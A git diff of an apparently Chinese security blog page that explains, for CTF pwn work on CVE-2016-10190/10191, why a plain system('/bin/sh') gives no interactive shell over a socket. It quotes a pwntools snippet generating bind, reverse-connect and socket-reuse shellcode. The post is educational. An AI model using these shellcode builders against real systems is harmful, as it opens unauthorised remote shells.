@@ -72,7 +72,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -257,14 +257,13 @@
       		<h1><span id="0-前言">0 前言</span></h1><p>​        研究2018-1160的时候，看到一篇文章中的一句话，让我费解到了现在：</p>
 <p><a target="_blank" rel="noopener" href="https://ddaa.tw/hitconctf_pwn_371_netatalk.html">HITCON CTF 2019 Pwn 371 Netatalk</a></p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-24%20%E4%B8%8A%E5%8D%8811.23.38.png" alt="截屏2022-10-24 上午11.23.38"></p>
-<p>非常不幸的是，最近在研究2016-10191的时候也遇到了同样的问题——onegadget无法getshell，以上种种让我对getshell这个看似简单的概念产生了巨大的疑惑，遂有了这一篇文章–getshell到底是什么？</p>
+<p>非常不幸的是，最近在研究2016-10191的时候也遇到了同样的问题——onegadget无法getshell，以上种种让我对getshell这个看似简单的概念产生了巨大的疑惑，遂有了这一篇文章—getshell到底是什么？</p>
 <h2><span id="问题解答">问题解答？</span></h2><p>​        首先讲我对于“自行dup i/o”的理解，可能有不对的地方。一般情况下，我们利用pwbntools封装的socket接口与远程程序进行交互，我们的io都已经被pwntools重定向到了socket上，所以我们如果希望程序执行<code>system(&quot;/bin/sh&quot;)</code>的话就只需要发送过去就好了。那么当程序执行这条语句的时候，就会生成一个本地的shell，再由pwntools发送过来以完成“交互”。但是如果程序本身就是由socket进行交互的话，我们希望程序执行<code>system(&quot;/bin/sh&quot;)</code>，那么好的情况它也只是会在本地执行<code>sh</code>,而这个弹出的shell并不能进行交互，因为没有渠道供我们与这个“shell”交互。所以解决方式就是利用shellcode或rop链反弹shell。</p>
 <h2><span id="ctf-getshell">ctf getshell</span></h2><p>​        首先从简单的ctf pwn开始。</p>
 <p>​        平时我们getshell的思路——控制程序执行流，rip劫持为提权函数。比如说覆盖某个函数指针为<code>system(&quot;/bin/sh&quot;)</code>，一般的流程是这样：本地打通后，连接远程环境，一般情况下也能拿到远程机器的shell。</p>
 <p>​        但是我们究竟是怎么与远端程序进行通信的？</p>
 <p>​        我们通常使用pwntool的<code>tubes</code>模块，比如</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">&quot;ip&quot;</span>,port)</span><br></pre></td></tr></table></figure>
-
 <p>​        这个函数其实非常好理解，但是实际上实现的功能并不简单。</p>
 <p>​        看一看pwntools的官方文档的解释：</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-24%20%E4%B8%8A%E5%8D%8811.20.27.png" alt="截屏2022-10-24 上午11.20.27"></p>
@@ -273,7 +272,6 @@
 <h2><span id="实战">实战</span></h2><p>如果程序通信是通过socket，那么我们无法通过简单的<code>one_gadget</code>或者什么弹shell，就需要用到一些方法。这里copy一下轩神的笔记：</p>
 <p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/">Getshell远程：真·RCE 正连？反连？不连？</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">shellcode1 = asm(shellcraft.sh())<span class="comment">#无交互式shell</span></span><br><span class="line">shellcode2 = asm(shellcraft.amd64.linux.bindsh(<span class="number">4444</span>))<span class="comment">#正连</span></span><br><span class="line">shellcode3 = asm(shellcraft.connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">4444</span>)+shellcraft.dupsh())<span class="comment">#反连</span></span><br><span class="line">shellcode4 = asm(shellcraft.dupsh(<span class="number">4</span>))<span class="comment">#不连</span></span><br><span class="line">shellcode5 = asm(shellcraft.findpeersh(io.lport))<span class="comment">#不连</span></span><br></pre></td></tr></table></figure>
-
 <p>以上几种就是常见的弹shell思路，在cve-2016-10190和10191就是两个很好的例子，他们都是使用socket进行通信，并且都是可以利用反连到<code>&#39;127.0.0.1&#39;</code>+<code>port</code>的shellcode来弹shell。</p>
 
             <div class="clearfix"></div>
